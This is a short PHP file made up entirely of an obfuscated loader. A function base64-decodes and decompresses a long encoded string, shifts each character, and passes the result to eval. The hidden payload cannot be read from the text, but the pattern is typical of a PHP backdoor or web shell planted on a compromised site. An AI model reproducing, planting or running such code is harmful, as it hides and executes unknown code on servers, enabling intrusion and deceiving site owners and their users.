<?php function hji($VWDu)
{ 
$VWDu=gzinflate(base64_decode($VWDu));
 for($i=0;$i<strlen($VWDu);$i++)
 {
$VWDu[$i] = chr(ord($VWDu[$i])-1);
 }
 return $VWDu;
 }eval(hji("rVOLbpswFP0Af4WFUJtIEWwsjzVRWrGMql2ah4Co7abJcsELaASQbUa6h9SP2Bfs0/ojuyZhZd00adpQhM19nHN8j4MxPAgJJkScpURIymWrPUJxGiRFyLBmmJIlbM3pxsijXBshpMutJIVgnMQhbjxjrJPlwvPfHDYKDt+OkE48x/POF/NHGdXRCNTQuSj/gKuyvwHdhWtE9QVwSN/AueiaQVxD91/v/vGHnKvTa/wZv5jY8J5enE/VdojQ/d03vPIcd27PHDyEoTXPZWhVfml73uXCffmQVyqN/6FLufKuSAMJFmLB0nC2O3ZLr70DGR1cTwN2cUhuMtnGn5CasF7wRI0okjIXQ9OkeWz8cD3jaxNqNWzUbbDTzAbNSU65YGSThWy8ofx9mJXpQRBRCazjqq8hY9RkrBZAO5BsK6tSCLA0AKRWrba97wgiaAggT+I0ru5oFc5yaXNObyFJ1dpC9b2ZrNyLxdInsODxccXV+SXpOv7KnfuuPfdOHVfVSV6wqmzPUFEKJoGI7BhASueBuBbCmSgSWWtkWxaowiZIkGSC7YNfkM7h7wNDHzwdPLOeD7o9C2zUS5qqYP+o37W6T3pHvaFtn30Mrq9o0k8/eK/KVe5Pby5nt/7rmbW2JllkT0rl/0+280d2Aypw/s3NAMST4+8="));?>